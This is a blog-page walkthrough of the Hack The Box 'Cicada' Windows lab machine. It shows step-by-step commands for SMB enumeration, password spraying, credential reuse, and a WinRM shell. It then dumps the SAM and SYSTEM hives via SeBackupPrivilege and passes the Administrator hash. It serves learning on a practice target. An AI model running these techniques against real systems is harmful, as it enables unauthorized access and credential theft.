@@ -1,0 +1,140 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Cicada | foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Cicada</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2025-03-03T23:25:46.000Z" id="date"> 2025-03-03</time></div></span><br><span>Last Update: <div class="control"><time datetime="2025-03-04T21:16:50.408Z" id="updated"> 2025-03-04</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 20px;">
+
+  <!-- Image Section -->
+  <div style="flex: 1 1 auto; max-width: 300px; text-align: center;" class='item-img' data-src='cicada.png'><img src="cicada.png" title="Cicada" width="300px" height="300px" style="pointer-events: none; max-width: 100%; height: auto;">
+  </div>
+
+  <!-- Details Section -->
+  <div style="flex: 1 1 300px; display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS:</strong class='item-img' data-src='windows.png'><img src="windows.png" alt="Windows" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">Windows</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Easy</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>theblxckcicada</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>September 28, 2024</span>
+    </div>
+  </div>
+
+</div>
+
+<style>
+  @media (max-width: 600px) {
+    div[style*="display: flex; flex-wrap: wrap;"] {
+      flex-direction: column;
+      align-items: center;
+    }
+
+    div[style*="flex: 1 1 auto;"] {
+      max-width: 100%;
+      text-align: center;
+    }
+
+    div[style*="flex: 1 1 300px;"] {
+      flex: 1 1 auto;
+      max-width: 100%;
+    }
+  }
+</style>
+
+<h2 id="Video-Walkthrough"><a href="#Video-Walkthrough" class="headerlink" title="Video Walkthrough"></a>Video Walkthrough</h2><iframe width="560" height="315" src="https://www.youtube.com/embed/7VJcDYW5Y38?si=Adt9l2jdmMIbM3-o" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -p- 10.10.11.35 -o initial_scan.nmap <br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.35<br>Host is up (0.041s latency).<br>Not shown: 65522 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-04 05:06:15Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb<br>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb<br>| Not valid before: 2024-08-22T20:24:16<br>|_Not valid after:  2025-08-22T20:24:16<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb<br>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb<br>| Not valid before: 2024-08-22T20:24:16<br>|_Not valid after:  2025-08-22T20:24:16<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb<br>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb<br>| Not valid before: 2024-08-22T20:24:16<br>|_Not valid after:  2025-08-22T20:24:16<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb<br>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb<br>| Not valid before: 2024-08-22T20:24:16<br>|_Not valid after:  2025-08-22T20:24:16<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>59896/tcp open  msrpc         Microsoft Windows RPC<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running (JUST GUESSING): Microsoft Windows 2022 (88%)<br>OS CPE: cpe:/o:microsoft:windows_server_2022<br>Aggressive OS guesses: Microsoft Windows Server 2022 (88%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2025-03-04T05:07:09<br>|_  start_date: N/A<br>|_clock-skew: 6h59m59s<br><br>TRACEROUTE (using port 139/tcp)<br>HOP RTT      ADDRESS<br>1   40.58 ms 10.10.14.1<br>2   41.44 ms 10.10.11.35<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Mon Mar  3 22:07:49 2025 -- 1 IP address (1 host up) scanned in 189.08 seconds</span><br><br></code></pre></td></tr></table></figure>
+
+
+<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="SMB-Without-Password"><a href="#SMB-Without-Password" class="headerlink" title="SMB Without Password"></a>SMB Without Password</h3><p>We can find two non default shares without using a password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L \\\\10.10.11.35\\<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/shares.png'><img src="/HTB/Cicada/shares.png"></p>
+<p>We can access the HR share and download a file called “Notice from HR.txt”</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient \\\\10.10.11.35\\HR<br>get <span class="hljs-string">&quot;Notice from HR.txt”</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/notice.png'><img src="/HTB/Cicada/notice.png"></p>
+<p>From the file’s content, we get a password<br class='item-img' data-src='/HTB/Cicada/noticecontent.png'><img src="/HTB/Cicada/noticecontent.png"></p>
+<blockquote>
+<p>Cicada$M6Corpb*@Lp#nZp!8</p>
+</blockquote>
+<h3 id="RID-Enumeration"><a href="#RID-Enumeration" class="headerlink" title="RID Enumeration"></a>RID Enumeration</h3><p>With the obtained password, we can use <a target="_blank" rel="noopener" href="https://github.com/trustedsec/ridenum">ridenum</a> to enumerate users through RID enumeration</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ridenum 10.10.11.35 500 5000 <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&#x27;Cicada$M6Corpb*@Lp#nZp!8’</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/ridenum.png'><img src="/HTB/Cicada/ridenum.png"></p>
+<p>We now have a file with the new obtained users<br>We can use <a target="_blank" rel="noopener" href="https://github.com/Pennyw0rth/NetExec">NetExec</a> to find out if any user uses the previously obtained password.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netexec smb 10.10.11.35 -u 10.10.11.35_users.txt -p <span class="hljs-string">&#x27;Cicada$M6Corpb*@Lp#nZp!8’</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/michael.png'><img src="/HTB/Cicada/michael.png"></p>
+<p>The user ‘michael.wrightson’ uses the password ‘Cicada$M6Corpb*@Lp#nZp!8’, we can use this to try and enumerate more users</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netexec smb 10.10.11.35 -d cicada.htb -u <span class="hljs-string">&#x27;michael.wrightson&#x27;</span> -p <span class="hljs-string">&#x27;Cicada$M6Corpb*@Lp#nZp!8&#x27;</span> --<span class="hljs-built_in">users</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/users.png'><img src="/HTB/Cicada/users.png"><br>We can see the password for the user ‘david.orelious’ in the user’s description</p>
+<blockquote>
+<p>david.orelious:aRt$Lp#7t*VQ!3</p>
+</blockquote>
+<p>Enumerate shares with the new credentials</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netexec smb 10.10.11.35 -d cicada.htb -u <span class="hljs-string">&#x27;david.orelious&#x27;</span> -p <span class="hljs-string">&#x27;aRt$Lp#7t*VQ!3&#x27;</span> --shares<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/sharesdavid.png'><img src="/HTB/Cicada/sharesdavid.png"></p>
+<p>This user has READ access to the “DEV” share</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient \\\\10.10.11.35\\DEV -U david.orelious<br>get Backup_script.ps1<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/emilycreds.png'><img src="/HTB/Cicada/emilycreds.png"></p>
+<blockquote>
+<p>emily.oscars:Q!3@Lp#M6b<em>7t</em>Vt</p>
+</blockquote>
+<p>Now we can get a shell as emily using <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -i 10.10.11.35 -u <span class="hljs-string">&#x27;emily.oscars&#x27;</span> -p <span class="hljs-string">&#x27;Q!3@Lp#M6b*7t*Vt&#x27;</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/emilyshell.png'><img src="/HTB/Cicada/emilyshell.png"></p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="SeBackupPrivilge"><a href="#SeBackupPrivilge" class="headerlink" title="SeBackupPrivilge"></a>SeBackupPrivilge</h3><p>If we check the current user’s privileges, we can find the SeBackupPrivilege is enabled</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/privs.png'><img src="/HTB/Cicada/privs.png"></p>
+<p>By googling privilege escalation with this privilege, we can find this <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">blog post</a><br>With this privilege we can save a backup of the SAM and SYSTEM hives, and then transfer it to our machine to extract the hive secrets</p>
+<p>So the first step is to save the backup of both hives (SAM and SYSTEM)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> c:\<br><span class="hljs-built_in">mkdir</span> Temp<br>reg save hklm\sam c:\Temp\sam<br>reg save hklm\system c:\Temp\system`<br></code></pre></td></tr></table></figure>
+
+<p>And then transfer both to our machine</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> Temp<br>download sam<br>download system`<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/hivebackup.png'><img src="/HTB/Cicada/hivebackup.png"></p>
+<p>With both files in our machine we can run <a target="_blank" rel="noopener" href="https://github.com/skelsec/pypykatz">pypykatz</a> to extract the hive’s secrets</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pypykatz registry --sam sam system<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/pypykatz.png'><img src="/HTB/Cicada/pypykatz.png"></p>
+<blockquote>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::</p>
+</blockquote>
+<p>With the Administrator NTLM hash, we can just get a shell using evil-winrm</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -i 10.10.11.35 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Cicada/adminshell.png'><img src="/HTB/Cicada/adminshell.png"></p>
+<p>Rooted :)</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Chemistry/">← Next [HTB] Chemistry</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Sightless/">[HTB] Sightless Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'foguh' Ferreira</a></h1><div id="description"><p>SOC Analyst</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Video-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Video Walkthrough</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">2.1.</span> <span class="toc-text">Nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User"><span class="toc-number">3.</span> <span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-Without-Password"><span class="toc-number">3.1.</span> <span class="toc-text">SMB Without Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RID-Enumeration"><span class="toc-number">3.2.</span> <span class="toc-text">RID Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SeBackupPrivilge"><span class="toc-number">4.1.</span> <span class="toc-text">SeBackupPrivilge</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
